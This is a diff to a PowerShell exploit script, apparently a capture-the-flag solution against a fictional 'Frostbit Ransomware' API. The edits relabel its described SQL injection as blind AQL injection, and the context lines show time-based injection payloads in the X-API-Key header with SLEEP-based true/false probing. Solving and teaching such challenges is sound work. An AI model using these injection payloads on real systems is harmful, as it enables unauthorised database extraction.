@@ -14,7 +14,7 @@
     .DESCRIPTION
 
         This script exfiltrates data from the Frostbit Ransomware API server running ArangoDB as the backend DBMS.
-        It is based on a SQLi in the X-API-Key HTTP header.  We're able to execute our own operations using
+        It is based on a blind AQLi (SQLi) in the X-API-Key HTTP header.  We're able to execute our own operations using
         the ternary operator (true or false statement or operation) ? (run if true) : (run if false).
 
         This allows us to exfiltrate data using numerous unfiltered operators such as ATTRIBUTES, LENGTH,
@@ -33,7 +33,7 @@
         TRUE  response time 2120 ms : X-API-Key: ' OR  "_id" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         FALSE response time  267 ms : X-API-Key: ' OR   "_i" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         
-        Based on the sql error from the api, these expand out to:
+        Based on the AQL error from the api, these expand out to:
         FOR doc IN config
             FILTER doc.<key_name_omitted> == '' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : ''
             <other_query_lines_omitted>
@@ -329,3 +329,4 @@ else{
 $swtotal.Stop()
 "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
+
